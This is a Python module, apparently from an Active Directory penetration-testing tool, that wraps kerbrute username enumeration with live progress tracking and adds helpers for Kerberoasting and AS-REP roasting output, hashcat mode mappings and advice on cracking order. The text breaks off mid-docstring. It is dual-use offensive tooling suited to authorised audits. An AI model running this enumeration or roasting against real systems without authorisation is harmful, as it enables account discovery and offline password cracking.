"""Kerberos enumeration mixin.

This module provides Kerberos-focused enumeration operations including:
- Ticket artifact discovery (ccache, kirbi, keytab)
- Native Kerberoasting helpers (via kerbad)
- Native AS-REP roasting helpers (via kerbad)

Kerberos protocol operations (TGT, TGS, roasting) use kerbad via
``kerberos_transport``.  impacket.krb5 is intentionally absent from this
module.  See AGENTS.md § Migration 4 for rationale.

INTENTIONALLY KEPT ON IMPACKET (hard stops from migration spec):
- ``rodc_golden_ticket.py`` — PAC forging, stays on impacket permanently
- ``kerberos_key_list.py``  — stays on impacket (DECISION PENDING evaluation)
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable, Iterable, Optional, List
import subprocess
import shlex
import re

from rich.table import Table

from adscan_internal.core import AuthMode, requires_auth
from adscan_internal.command_runner import CommandSpec, default_runner
from adscan_internal.rich_output import mark_sensitive, print_info_debug
from adscan_internal.services.async_bridge import run_async_sync
from adscan_core.rich_output import (
    print_panel,
    print_table,
    print_info,
    print_info_verbose,
    print_success,
    print_warning,
    print_error,
    is_verbose_mode,
)
from adscan_internal.subprocess_env import (
    command_string_needs_clean_env,
    get_clean_env_for_compilation,
)
from adscan_internal.services.ldap_transport_service import (
    execute_with_ldap_fallback,
    prepare_kerberos_ldap_environment,
    resolve_ldap_target_endpoints,
)
from adscan_internal.services.cooperative_cancellation import (
    CooperativeCancellation,
)
from adscan_internal.integrations.impacket import (
    KerberoastHash,
    ASREPHash,
)
from adscan_internal.services.kerberos_transport import (
    KerberosConfig,
    KerberosTransportError,
    KerberosClockSkewError,
    kerberoast_users,
    asreproast_users,
)
from adscan_internal import telemetry
from adscan_core.interaction import is_non_interactive
from adscan_core.tui.patience_notice import (
    PatienceNoticeConfig,
    maybe_show_patience_notice,
)
from adscan_core.tui.progress_dashboard import (
    ProgressDashboard,
    ProgressDashboardConfig,
)
from adscan_core.tui.stream_runner import (
    StreamedProcessResult,
    stream_command_lines,
)


_UF_ACCOUNTDISABLE = 0x0002
_UF_DONT_REQUIRE_PREAUTH = 0x400000


CommandExecutor = Callable[[str, int], subprocess.CompletedProcess[str]]


# --- kerbrute throughput / ETA / cap SSOT -----------------------------------
#
# Calibrated from a real audit run against a lab DC: kerbrute ``userenum`` at
# its Go-default 10 threads sustained ~11 valid-username checks/sec. userenum
# is RTT-bound (one Kerberos AS-REQ round-trip per candidate per worker
# thread), so throughput scales ~linearly with ``--threads``.
_KERBRUTE_BASELINE_THREADS = 10
_KERBRUTE_BASELINE_RATE_PER_SEC = 11.0

# 5x the Go default. Still comfortably RTT-bound against a single DC (no
# packet-flood risk -- see adscan-ad-constraints Sec 10 scale/OPSEC), and
# turns a ~6h "statistically likely usernames" run into roughly an hour.
KERBRUTE_THREADS = 50

# No opted-in run, however large, should be allowed to hang indefinitely.
_KERBRUTE_TIMEOUT_HARD_CAP_SECONDS = 6 * 3600

# Headroom over the raw projection for network jitter / VPN latency.
_KERBRUTE_TIMEOUT_MARGIN = 1.2

# Wall-clock budget (seconds) a wordlist auto-selected without an explicit
# opt-in must complete within.
_KERBRUTE_DEFAULT_BUDGET_SECONDS = 300


def estimate_kerbrute_throughput_per_sec(*, threads: int = KERBRUTE_THREADS) -> float:
    """Estimate kerbrute ``userenum`` throughput (valid usernames/sec).

    Args:
        threads: ``--threads`` value the run will use.

    Returns:
        Estimated candidates-per-second throughput, linearly scaled from the
        calibrated baseline (~11/s @ 10 threads).
    """
    effective_threads = threads if threads > 0 else _KERBRUTE_BASELINE_THREADS
    return _KERBRUTE_BASELINE_RATE_PER_SEC * (
        effective_threads / _KERBRUTE_BASELINE_THREADS
    )


def estimate_kerbrute_duration_seconds(
    count: int, *, threads: int = KERBRUTE_THREADS
) -> float:
    """Project kerbrute ``userenum`` wall-clock duration for ``count`` candidates.

    Args:
        count: Number of username candidates in the wordlist.
        threads: ``--threads`` value the run will use.

    Returns:
        Projected wall-clock seconds, or ``0.0`` for a non-positive count.
    """
    if count <= 0:
        return 0.0
    rate = estimate_kerbrute_throughput_per_sec(threads=threads)
    if rate <= 0:
        return 0.0
    return count / rate


def compute_default_wordlist_cap(
    *,
    target_seconds: int = _KERBRUTE_DEFAULT_BUDGET_SECONDS,
    threads: int = KERBRUTE_THREADS,
) -> int:
    """Largest candidate count that completes unattended within ``target_seconds``.

    Used to cap the default "statistically likely usernames" source so an
    ``audit`` workspace never silently launches an hours-long kerbrute run.

    Args:
        target_seconds: Safe wall-clock budget for an unattended default run.
        threads: ``--threads`` value the run will use.

    Returns:
        Candidate count cap, always >= 1.
    """
    rate = estimate_kerbrute_throughput_per_sec(threads=threads)
    return max(1, round(rate * target_seconds))


def estimate_kerbrute_subprocess_timeout_seconds(
    count: int,
    *,
    floor_seconds: int = 300,
    threads: int = KERBRUTE_THREADS,
) -> int:
    """Subprocess timeout budget covering the full projected run.

    Floors at the caller's existing timeout (so small-wordlist callers, e.g.
    the CN-inference / format-inference validation paths, are unaffected) and
    hard-caps at ~6h so an opted-in run of any size still terminates.

    Args:
        count: Number of username candidates in the wordlist.
        floor_seconds: The caller's pre-existing timeout -- never go below it.
        threads: ``--threads`` value the run will use.

    Returns:
        Subprocess timeout in whole seconds.
    """
    projected = (
        estimate_kerbrute_duration_seconds(count, threads=threads)
        * _KERBRUTE_TIMEOUT_MARGIN
    )
    return int(min(_KERBRUTE_TIMEOUT_HARD_CAP_SECONDS, max(floor_seconds, projected)))


# ``shell.spawn_command``-shaped callable: returns a text-mode Popen (or None).
# Threaded in by the CLI so the userenum live counter can be driven from
# kerbrute's STREAMING stdout instead of polling its buffered ``-o`` file.
SpawnCommand = Callable[..., "subprocess.Popen[str] | None"]


# Single source of truth for parsing kerbrute's live ``[+] VALID USERNAME``
# stdout lines. kerbrute wraps each hit in ANSI colour codes and a leading
# log prefix, e.g. (ESC shown literally):
#   \x1b[32m2026/06/11 12:42:12 >  [+] VALID USERNAME:\t adscan@lab.local\x1b[0m
# The marker text survives the colour codes, so a simple substring test is
# robust; the user is extracted by the shared ``_parse_userenum_output`` regex.
_KERBRUTE_VALID_USERNAME_MARKER = "VALID USERNAME"

# Marker kerbrute prints (ONLY with ``-v``) for an ATTEMPTED-but-invalid user,
# e.g. (ANSI/prefix omitted):
#   [!] invalidxyz@lab.local - User does not exist
#   [!] guest@lab.local - USER LOCKED OUT
# Empirically confirmed against lab.local @ 10.99.0.1 (kerbrute v1.0.3): with
# ``-v`` kerbrute emits ONE line per attempted username -- valid AND invalid --
# so counting (valid + invalid) attempt lines yields a DETERMINATE tested/total
# bar. Without ``-v`` only ``[+] VALID USERNAME`` lines appear (indeterminate).
# These invalid markers carry a ``user@domain`` token too, which is exactly why
# the username extractor below is ``VALID USERNAME``-anchored (see warning).
_KERBRUTE_INVALID_USER_MARKER = "[!]"


def _is_kerbrute_attempt_line(line: str, domain: str) -> bool:
    """True if ``line`` is a kerbrute per-attempt log line (valid OR invalid).

    Drives the DETERMINATE progress counter: with ``-v`` kerbrute logs one such
    line for every username it tested, so counting them gives a true
    ``tested / total`` bar. A line counts as an attempt when it carries an
    ``@`` token AND is either a ``[+] VALID USERNAME`` hit or a
    ``[!] ... - User does not exist`` / ``USER LOCKED OUT`` miss. Banner /
    ``Using KDC(s)`` / ``Done!`` lines have no ``user@domain`` token and are
    excluded, so the count never over-shoots ``total``.

    Args:
        line: One raw kerbrute output line (ANSI codes / prefix tolerated).
        domain: Target domain (kept for signature symmetry / future anchoring).

    Returns:
        True when the line represents exactly one tested username.
    """
    text = str(line)
    if "@" not in text:
        return False
    if _KERBRUTE_VALID_USERNAME_MARKER in text:
        return True
    if _KERBRUTE_INVALID_USER_MARKER in text:
        # An invalid / locked-out attempt line (only emitted under ``-v``).
        return True
    return False


def _parse_userenum_output_lines(lines: "list[str] | Iterable[str]", domain: str) -> list[str]:
    """Extract unique VALID usernames from kerbrute ``userenum`` output lines.

    Single source of truth for turning kerbrute output (whether stdout streamed
    line-by-line or the on-disk ``-o`` file read whole) into the deduplicated,
    lowercased, first-seen-ordered list of *valid* usernames. Used by the live
    streaming parser, the success path, and the timeout / non-zero-exit recovery
    paths so behaviour stays identical across all of them.

    WARNING -- ``VALID USERNAME``-anchored on purpose. kerbrute run with ``-v``
    (which the determinate live bar requires) ALSO logs invalid attempts as
    ``[!] invalidxyz@lab.local - User does not exist`` -- to BOTH stdout and the
    ``-o`` file. Those lines carry a ``user@domain`` token, so a parser that
    accepted any ``@domain`` token would mis-report every invalid / locked user
    as valid. We therefore only accept lines containing the ``VALID USERNAME``
    marker. This keeps credential capture correct whether or not ``-v`` is set.

    Args:
        lines: Iterable of raw kerbrute output lines (any ANSI colour codes and
            log prefixes are tolerated; the ``user@domain`` token is extracted).
        domain: Target Active Directory domain, used to anchor the extraction
            regex.

    Returns:
        List of unique valid usernames (lowercase), in first-seen order.
    """
    usernames: list[str] = []
    seen: set[str] = set()

    for raw_line in lines:
        line = str(raw_line).strip()
        if not line or "@" not in line:
            continue

        # Only a genuine ``[+] VALID USERNAME`` hit is a valid user. Invalid /
        # locked attempt lines (``[!] ... - User does not exist``) emitted under
        # ``-v`` also contain ``user@domain`` and MUST NOT be treated as valid.
        if _KERBRUTE_VALID_USERNAME_MARKER not in line:
            continue

        # Kerbrute prints lines like:
        #   [+] VALID USERNAME: user@domain.local
        # We perform a best-effort extraction of the `user` part.
        match = re.search(
            rf"\b([A-Za-z0-9._$-]+)@{re.escape(domain)}\b", line, re.IGNORECASE
        )
        if not match:
            # Fallback: look for any token containing '@'.
            token_user: Optional[str] = None
            for token in line.split():
                if "@" in token:
                    token_user = token.split("@", 1)[0]
                    break
            if not token_user:
                continue
            candidate = token_user
        else:
            candidate = match.group(1)

        user = (candidate or "").strip().lower()
        if not user or user == "ronnie":
            # Preserve original behaviour that skipped the lab author user.
            continue
        if user in seen:
            continue
        seen.add(user)
        usernames.append(user)

    return usernames


def _default_executor(command: str, timeout: int) -> subprocess.CompletedProcess[str]:
    """Execute a command using the shared command runner.

    Args:
        command: Command string to execute.
        timeout: Timeout in seconds.

    Returns:
        Completed process result.
    """
    use_clean_env = command_string_needs_clean_env(command)
    cmd_env = get_clean_env_for_compilation() if use_clean_env else None
    return default_runner.run(
        CommandSpec(
            command=command,
            timeout=timeout,
            shell=True,
            capture_output=True,
            text=True,
            check=False,
            env=cmd_env,
        )
    )


# Number of most-recent VALID usernames to show in the dashboard's bounded
# "recent found" window. DISPLAY cap only (the -o file keeps every hit).
_USERENUM_RECENT_HITS = 10


def _build_userenum_dashboard(total: "int | None" = None) -> ProgressDashboard:
    """User-enumeration dashboard driven by kerbrute's streaming stdout.

    kerbrute buffers its ``-o`` output file (Go ``bufio`` writer, flushed in
    chunks / at close), so counting lines in that file reads 0 until the
    process exits and then jumps. kerbrute's STDOUT, by contrast, flushes one
    log line per ATTEMPTED username in real time (with ``-v``), so the streamer
    can drive a true progress bar from what it parses.

    Two modes, selected by ``total``:

    * **Determinate** (``total`` is the userlist line count, the number of
      usernames kerbrute will test): a real ``tested / N`` bar + rate + ETA,
      ticked from the per-attempt lines kerbrute emits under ``-v``. This is
      the preferred mode -- the operator sees how many of N have been tried.
    * **Indeterminate** (``total is None``): spinner + elapsed + "found N so
      far", ticked from ``[+] VALID USERNAME`` hits only. Used when the
      userlist size is unknown or when ``-v`` per-attempt lines are absent.

    Args:
        total: Number of candidate usernames (userlist line count) for the
            determinate bar, or ``None`` for the indeterminate spinner mode.

    Returns:
        A configured :class:`ProgressDashboard`.
    """
    return ProgressDashboard(
        ProgressDashboardConfig(
            title="Kerberos user enumeration",
            total=total if (total and total > 0) else None,
            unit="users",
            last_item_type="user",
            # Bounded rolling list of the most-recent VALID usernames. The
            # deque(maxlen=K) cap keeps the panel a fixed height even at scale
            # (1000+ hits) so the LiveSession alt-screen never leaks ghost
            # frames (CLAUDE.md stable-line-count rule). DISPLAY-ONLY: the
            # authoritative capture stays the kerbrute ``-o`` file.
            recent_max=_USERENUM_RECENT_HITS,
            recent_item_type="user",
            recent_label="found",
        )
    )


# Coalesce dashboard frames to at most one per this many attempt lines, so a
# 100k-username run does not push 100k Rich renders (the LiveSession caps to
# ~8 FPS, but skipping the render call entirely is cheaper still). A VALID hit
# always forces an immediate frame regardless of this cap so "found N" never
# lags. Tuned for a 100k list: ~200 frames total on the progress bar.
_USERENUM_FRAME_EVERY_N_ATTEMPTS = 500


def _stream_userenum_into_dashboard(
    spawn: "SpawnCommand",
    cmd: str,
    timeout: int,
    domain: str,
    dashboard: "ProgressDashboard",
    *,
    total: "int | None" = None,
    cancellation: "CooperativeCancellation | None" = None,
) -> "StreamedProcessResult | None":
    """Stream kerbrute ``userenum`` stdout, driving the live progress bar.

    Spawns kerbrute through the shared :func:`stream_command_lines` streamer
    (which uses ``shell.spawn_command`` -- preserving the PyInstaller clean-env
    handling -- enforces its own wall-clock budget, and drains the remaining
    output). The per-line callback parses each line as kerbrute flushes it:

    * Every ATTEMPTED-username line (``[+] VALID USERNAME`` hit OR ``[!] ...``
      miss, both emitted under ``-v``) increments ``tested`` and -- in
      determinate mode (``total`` known) -- ticks the ``tested / N`` bar with
      the current username, so the operator sees ``X/N · Y% · current user``
      climbing DURING the run.
    * Every ``[+] VALID USERNAME`` hit additionally bumps the ``found`` count
      (rendered in the success-counter row) and forces an immediate frame.

    Dashboard frames are coalesced (one per ``_USERENUM_FRAME_EVERY_N_ATTEMPTS``
    attempts, plus one per valid hit) so a huge userlist does not thrash the
    render. On clean stream close the bar is snapped to ``tested`` so the final
    frame is honest even if the last batch was below the coalesce threshold.

    The ``-o`` output file written by kerbrute itself (via the ``-o`` flag in
    ``cmd``) is left untouched and remains the authoritative source for the
    downstream credential-capture parsing; streaming only drives the counter.

    Args:
        spawn: ``shell.spawn_command``-shaped callable.
        cmd: Fully-built kerbrute command string (already shell-quoted).
        timeout: Wall-clock budget in seconds.
        domain: Target domain, used to anchor the username-extraction regex.
        dashboard: Live dashboard to drive.
        total: Userlist line count for the determinate bar, or ``None`` for the
            indeterminate "found N" mode.
        cancellation: Optional cooperative-cancellation token (operator
            Ctrl+C / platform "Stop" sentinel). When it fires mid-run the
            kerbrute process is stopped exactly like a wall-clock timeout --
            the caller tells the two apart via ``result.cancelled`` and
            recovers the usernames found before the stop the same way it
            recovers a timeout's partial output.

    Returns:
        A :class:`StreamedProcessResult` on completion, or ``None`` if the
        process could not be spawned (caller falls back to the blocking path).
    """
    determinate = bool(total and total > 0)
    seen_valid: set[str] = set()
    state = {"tested": 0}

    def _push_frame(last: "str | None") -> None:
        try:
            if determinate:
                # done = usernames tested so far (clamped to total by the bar);
                # success = valid hits so far. last = the current username (raw;
                # masked at render -- CLAUDE.md TeeConsole invariant).
                dashboard.update(
                    done=state["tested"],
                    success=len(seen_valid),
                    last=last,
                )
            else:
                # Indeterminate: both the header ("found N", reads done) and the
                # counter row ("✓ users N", reads success) track the valid-hit
                # count, so pass success= as well -- otherwise the counter row
                # stays stuck at 0 while the header advances (they disagree).
                dashboard.update(
                    done=len(seen_valid),
                    success=len(seen_valid),
                    last=last,
                )
        except Exception:  # noqa: BLE001 -- render must not abort the run
            pass

    def _on_line(line: str) -> None:
        is_valid = _KERBRUTE_VALID_USERNAME_MARKER in line
        is_attempt = _is_kerbrute_attempt_line(line, domain)

        current_user: "str | None" = None
        if is_valid:
            # Reuse the canonical parser so streamed + on-disk parsing agree.
            for user in _parse_userenum_output_lines([line], domain):
                if user not in seen_valid:
                    # Feed the RAW username into the bounded "recent found"
                    # window (masked at render -- TeeConsole invariant). The
                    # dashboard caps the displayed rows; this never drops a
                    # hit from the authoritative -o file.
                    try:
                        dashboard.record_recent(user)
                    except Exception:  # noqa: BLE001 -- render must not abort run
                        pass
                current_user = user
                seen_valid.add(user)

        if not is_attempt:
            return
        state["tested"] += 1

        # A valid hit always forces an immediate frame (so "found N" never
        # lags); otherwise coalesce to one frame per N attempts.
        if is_valid or (state["tested"] % _USERENUM_FRAME_EVERY_N_ATTEMPTS == 0):
            _push_frame(current_user)

    def _on_drain() -> None:
        # Snap the bar to the final tested count on clean close, so the last
        # frame is honest even if the trailing batch was below the threshold.
        _push_frame(None)

    return stream_command_lines(
        spawn,
        command=cmd,
        timeout_seconds=timeout,
        on_line=_on_line,
        on_drain=_on_drain,
        should_cancel=cancellation.should_stop if cancellation is not None else None,
        on_cancel=(lambda: _push_frame(None)) if cancellation is not None else None,
    )


def _run_userenum_with_dashboard(
    exec_fn: "CommandExecutor",
    cmd: str,
    timeout: int,
    count_found: Callable[[], int],
    *,
    spawn: "SpawnCommand | None" = None,
    domain: str = "",
    total: "int | None" = None,
    cancellation: "CooperativeCancellation | None" = None,
) -> "subprocess.CompletedProcess[str]":
    """Run kerbrute ``userenum`` under a live progress dashboard.

    Preferred path (``spawn`` provided): stream kerbrute's stdout via
    :func:`_stream_userenum_into_dashboard`, parsing each per-attempt line as it
    flushes. When ``total`` (the userlist line count) is known, this drives a
    DETERMINATE ``tested / N`` bar -- the operator sees how many of N have been
    tried plus how many were valid -- otherwise a "found N" spinner. kerbrute
    still writes its ``-o`` file itself, which stays authoritative for
    downstream parsing -- streaming only drives the counter.

    Fallback path (no ``spawn``, or streaming/dashboard setup fails): run the
    blocking ``exec_fn`` in a worker thread and tick the counter by polling
    ``count_found`` (the legacy ``-o``-file VALID-line count). The thread is
    always joined, so it never leaks; ``fut.result()`` re-raises any exception
    (including ``subprocess.TimeoutExpired``) so the caller's error handling is
    preserved exactly.

    Args:
        exec_fn: Blocking executor ``(cmd, timeout) -> CompletedProcess`` used
            as the fail-safe fallback.
        cmd: Fully-built kerbrute command string.
        timeout: Subprocess / wall-clock timeout in seconds.
        count_found: Callable returning the current "found N" count from the
            ``-o`` output file (used only by the blocking fallback).
        spawn: Optional ``shell.spawn_command``-shaped callable enabling the
            live-streaming path.
        domain: Target domain, threaded to the streaming parser.
        total: Userlist line count for the determinate ``tested / N`` bar, or
            ``None`` for the indeterminate "found N" mode.
        cancellation: Optional cooperative-cancellation token, forwarded to
            :func:`_stream_userenum_into_dashboard`. ``None`` (the default)
            preserves the exact legacy behaviour for every caller that has
            not opted in.

    Returns:
        The :class:`subprocess.CompletedProcess` (or
        :class:`StreamedProcessResult`, which is CompletedProcess-shaped)
        produced by the run.
    """
    import concurrent.futures
    import time as _time

    try:
        dashboard = _build_userenum_dashboard(total)
    except Exception:  # noqa: BLE001 -- dashboard build must never block the scan
        return exec_fn(cmd, timeout)

    # Preferred: stream kerbrute stdout so the counter advances during the run.
    if spawn is not None:
        try:
            with dashboard.live_session():
                streamed = _stream_userenum_into_dashboard(
                    spawn,
                    cmd,
                    timeout,
                    domain,
                    dashboard,
                    total=total,
                    cancellation=cancellation,
                )
            if streamed is not None:
                if streamed.timed_out:
                    # Mirror the blocking path's contract so the caller's
                    # TimeoutExpired recovery branch fires identically.
                    raise subprocess.TimeoutExpired(
                        cmd=cmd, timeout=timeout, output=streamed.stdout
                    )
                return streamed
            # spawn returned None -- fall through to the blocking fallback.
        except subprocess.TimeoutExpired:
            raise
        except Exception:  # noqa: BLE001 -- streaming/LiveSession setup failed
            # Fall through to the blocking fallback so enumeration still runs.
            pass

    def _safe_update(dash: "ProgressDashboard") -> None:
        try:
            dash.update(done=count_found())
        except Exception:  # noqa: BLE001 -- a render error must not abort the run
            pass

    # Fallback: blocking call in a worker thread, counter polled from the -o
    # file. ``call_started`` flips to True the instant the future is created,
    # so we can tell a dashboard/LiveSession setup failure (fail-safe fallback)
    # apart from a failure raised by ``exec_fn`` itself (must propagate).
    call_started = False
    try:
        with dashboard.live_session():
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
                fut = pool.submit(exec_fn, cmd, timeout)
                call_started = True
                while not fut.done():
                    _safe_update(dashboard)
                    _time.sleep(0.25)
                result = fut.result()  # re-raises worker exceptions here
                _safe_update(dashboard)
                return result
    except Exception:  # noqa: BLE001
        if call_started:
            # ``exec_fn`` (or its worker plumbing) raised -- propagate to the
            # caller's existing try/except. Do NOT re-run kerbrute.
            raise
        # Dashboard / LiveSession failed before the call started -- fall back to
        # a plain blocking call so enumeration still completes.
        return exec_fn(cmd, timeout)


def _format_auth_mode(password: Optional[str], hashes: Optional[str]) -> str:
    """Return a user-facing authentication mode string."""
    if hashes:
        return "NT hash (pass-the-hash)"
    if password:
        return "Password"
    return "No credential"


def _render_roast_summary(
    *,
    title: str,
    rows: list[tuple[str, str, str, str]],
) -> None:
    """Render the per-user result table for a roasting operation.

    Args:
        title: Table title (e.g. "Kerberoast Results").
        rows: Sequence of ``(user_display, status, etype, detail)`` tuples
              already formatted for display.
    """
    if not rows:
        return
    table = Table(title=title, header_style="bold")
    table.add_column("User", overflow="fold")
    table.add_column("Result")
    table.add_column("Encryption", justify="center")
    table.add_column("Detail", overflow="fold")
    for user_display, status, etype, detail in rows:
        table.add_row(user_display, status, _styled_etype(etype), detail)
    print_table(table)


# Hashcat etype index → display label.
_ETYPE_LABEL: dict[str, str] = {
    "17": "AES-128",
    "18": "AES-256",
    "23": "RC4-HMAC",
}

# Hashcat modes differ between TGS-REP (kerberoast) and AS-REP (asreproast).
#   kerberoast:  RC4=13100  AES-128=19600  AES-256=19700
#   asreproast:  RC4=18200  AES-128=19800  AES-256=19900
_HASHCAT_MODES: dict[str, dict[str, str]] = {
    "kerberoast": {"23": "13100", "17": "19600", "18": "19700"},
    "asreproast": {"23": "18200", "17": "19800", "18": "19900"},
}


def _extract_etype(hash_line: Optional[str]) -> str:
    """Best-effort extraction of the etype label from a hashcat roast line."""
    if not hash_line:
        return "—"
    match = re.search(r"\$krb5(?:tgs|asrep)\$(\d+)\$", hash_line)
    if not match:
        return "—"
    return _ETYPE_LABEL.get(match.group(1), f"etype {match.group(1)}")


def _extract_etype_key(hash_line: Optional[str]) -> Optional[str]:
    """Return the raw etype number string from a roast hash line, or None."""
    if not hash_line:
        return None
    match = re.search(r"\$krb5(?:tgs|asrep)\$(\d+)\$", hash_line)
    return match.group(1) if match else None


def _styled_etype(label: str) -> str:
    """Wrap an etype label in Rich markup: RC4=green (fast), AES=yellow (slow)."""
    if label.startswith("RC4"):
        return f"[bold green]{label}[/bold green]"
    if label.startswith("AES"):
        return f"[bold yellow]{label}[/bold yellow]"
    return label


def _render_etype_advisory(
    etype_keys: list[str], roast_type: str = "kerberoast"
) -> None:
    """Print a cracking-difficulty advisory when AES tickets are present.

    RC4 (etype 23) cracks in minutes on consumer GPU.
    AES-128/256 (etypes 17/18) is ~200× slower — relevant for operator planning.
    """
    has_aes = any(k in ("17", "18") for k in etype_keys)
    has_rc4 = "23" in etype_keys
    if not has_aes:
        return

    modes = _HASHCAT_MODES.get(roast_type, _HASHCAT_MODES["kerberoast"])
    lines: list[str] = []

    if has_rc4 and has_aes:
        lines.append(
            "[bold yellow]Mixed encryption[/bold yellow]:"
            " RC4 and AES tickets recovered."
        )
        lines.append(
            f"  [green]RC4-HMAC[/green]  → hashcat mode [bold]{modes['23']}[/bold]"
            "  — cracks in minutes on consumer GPU"
        )
        lines.append(
            f"  [yellow]AES-128[/yellow]   → hashcat mode [bold]{modes['17']}[/bold]"
            "  — ~200× slower than RC4"
        )
        lines.append(
            f"  [yellow]AES-256[/yellow]   → hashcat mode [bold]{modes['18']}[/bold]"
            "  — ~200× slower than RC4"
        )
        lines.append(
            "\n[dim]Crack RC4 hashes first."
            " AES requires a targeted wordlist or GPU cluster.[/dim]"
        )
    else:
        lines.append("[bold yellow]All tickets use AES encryption.[/bold yellow]")
        lines.append(
            f"  [yellow]AES-128[/yellow]  → hashcat mode [bold]{modes['17']}[/bold]"
        )
        lines.append(
            f"  [yellow]AES-256[/yellow]  → hashcat mode [bold]{modes['18']}[/bold]"
        )
        lines.append(
            "\n[dim]AES cracking is ~200× slower than RC4. Use a focused wordlist "
            "(e.g. rockyou + rules) or a dedicated GPU rig. "
            "Weak or default passwords still crack quickly.[/dim]"
        )

    print_panel(
        "\n".join(lines),
        title="[bold yellow]⚠  Cracking Difficulty[/bold yellow]",
        border_style="yellow",
    )


@dataclass(frozen=True)
class KerberosTicketArtifact:
    """Kerberos ticket artefact discovered in a workspace.

    Attributes:
        principal: Optional principal inferred from filename or metadata.
        path: Absolute path to the artefact.
        kind: Artefact kind (ccache/kirbi/keytab/unknown).
    """

    principal: Optional[str]
    path: Path
    kind: str


class KerberosEnumerationMixin:
    """Kerberos enumeration operations.

    This mixin is composed by :class:`adscan_internal.services.enumeration.EnumerationService`.
    """

    def __init__(self, parent_service):
        """Initialize Kerberos enumeration mixin.

        Args:
            parent_service: Parent EnumerationService instance.
        """
        self.parent = parent_service
        self.logger = parent_service.logger

    @requires_auth(AuthMode.AUTHENTICATED)
    def discover_ticket_artifacts(
        self,
        workspace_dir: str,
        domain: str,
        *,
        scan_id: Optional[str] = None,
    ) -> list[KerberosTicketArtifact]:
        """Discover Kerberos ticket artefacts within the workspace.

        This searches common locations like:
        - ``<workspace>/domains/<domain>/kerberos/tickets`` (new layout)
        - ``<workspace>/domains/<domain>/kerberos`` (legacy layout)

        Args:
            workspace_dir: Workspace root directory.
            domain: Target domain name.
            scan_id: Optional scan id for progress emission.

        Returns:
            List of ticket artefacts discovered.
        """
        root = Path(workspace_dir).expanduser().resolve()
        tickets_root = root / "domains" / domain / "kerberos"
        candidates = [
            tickets_root / "tickets",
            tickets_root,
        ]

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_artifacts",
            progress=0.0,
            message=f"Searching Kerberos artefacts for {domain}",
        )

        artifacts: list[KerberosTicketArtifact] = []
        for directory in candidates:
            if not directory.exists() or not directory.is_dir():
                continue
            artifacts.extend(self._scan_ticket_dir(directory))

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_artifacts",
            progress=1.0,
            message=f"Kerberos artefact discovery completed: {len(artifacts)} found",
        )
        return artifacts

    def _scan_ticket_dir(self, directory: Path) -> list[KerberosTicketArtifact]:
        """Scan a directory for ticket artefacts.

        Args:
            directory: Directory to scan.

        Returns:
            List of artifacts.
        """
        artifacts: list[KerberosTicketArtifact] = []
        for path in directory.rglob("*"):
            if not path.is_file():
                continue

            kind = self._infer_ticket_kind(path)
            if kind == "unknown":
                continue

            principal = self._infer_principal(path)
            artifacts.append(
                KerberosTicketArtifact(
                    principal=principal,
                    path=path.resolve(),
                    kind=kind,
                )
            )
        return artifacts

    @staticmethod
    def _infer_ticket_kind(path: Path) -> str:
        """Infer artefact kind from filename suffix."""
        suffix = path.suffix.lower()
        if suffix in (".ccache", ".cache"):
            return "ccache"
        if suffix == ".kirbi":
            return "kirbi"
        if suffix == ".keytab":
            return "keytab"
        return "unknown"

    @staticmethod
    def _infer_principal(path: Path) -> Optional[str]:
        """Best-effort principal inference from filename.

        We intentionally keep this heuristic minimal to avoid false positives.
        """
        name = path.name
        if "@" in name:
            # Example: administrator@domain.ccache
            return name.split("@", 1)[0]
        return None

    def _parse_userenum_output(self, text: str, domain: str) -> list[str]:
        """Extract unique usernames from kerbrute ``userenum`` output text.

        Kerbrute streams ``VALID USERNAME`` lines to both stdout and its ``-o``
        output file, e.g.::

            [+] VALID USERNAME: user@domain.local

        This is the single source of truth for parsing those lines. It is used
        by the success path (parsing the on-disk ``-o`` file) and by the
        timeout / non-zero-returncode recovery paths (parsing partial stdout
        and/or the partial ``-o`` file), so behaviour stays identical across
        all of them.

        Args:
            text: Raw kerbrute output (stdout or ``-o`` file contents).
            domain: Target Active Directory domain, used to anchor the
                ``user@domain`` extraction regex.

        Returns:
            List of unique usernames (lowercase), in first-seen order.
        """
        return _parse_userenum_output_lines(text.splitlines(), domain)

    def _recover_partial_userenum(
        self,
        stdout: object,
        output_file: Path,
        domain: str,
    ) -> list[str]:
        """Recover usernames found before a timeout / non-zero exit.

        Unions the usernames parsed from the (partial) process ``stdout`` and
        the (partial, possibly locked) on-disk ``-o`` file, deduplicating by
        the canonical user identity via :meth:`_parse_userenum_output`. Reads
        are fully defensive: any failure degrades to whatever was recovered so
        far (ultimately ``[]``), never raising into the caller's error branch.

        Args:
            stdout: The process/exception ``stdout`` (may be ``None`` or bytes).
            output_file: Path to the kerbrute ``-o`` output file.
            domain: Target Active Directory domain.

        Returns:
            List of unique usernames (lowercase), in first-seen order, unioned
            across both sources.
        """
        recovered: list[str] = []
        seen: set[str] = set()

        def _ingest(text: str) -> None:
            for user in self._parse_userenum_output(text, domain):
                if user in seen:
                    continue
                seen.add(user)
                recovered.append(user)

        # Source 1: partial stdout captured on the process / exception.
        try:
            if stdout:
                if isinstance(stdout, bytes):
                    stdout_text = stdout.decode("utf-8", errors="ignore")
                else:
                    stdout_text = str(stdout)
                _ingest(stdout_text)
        except Exception:  # noqa: BLE001 -- recovery must never raise.
            pass

        # Source 2: the on-disk -o file (same file _count_found reads live).
        try:
            file_text = output_file.read_text(encoding="utf-8", errors="ignore")
            _ingest(file_text)
        except OSError:
            pass
        except Exception:  # noqa: BLE001 -- recovery must never raise.
            pass

        return recovered

    @requires_auth(AuthMode.UNAUTHENTICATED)
    def enumerate_users_kerberos(
        self,
        domain: str,
        pdc: str,
        *,
        wordlist: str,
        kerbrute_path: str,
        output_file: Path,
        executor: CommandExecutor | None = None,
        spawn: "SpawnCommand | None" = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,
        auth_mode: AuthMode = AuthMode.UNAUTHENTICATED,
        cancellation: "CooperativeCancellation | None" = None,
    ) -> List[str]:
        """Enumerate users via Kerberos without LDAP access.

        This method wraps ``kerbrute userenum`` to perform username
        enumeration using Kerberos pre-authentication.

        The CLI is responsible for interactive wordlist selection and
        workspace layout; this helper focuses on command construction,
        execution, and parsing the resulting user list.

        Args:
            domain: Target Active Directory domain.
            pdc: Primary Domain Controller IP/hostname.
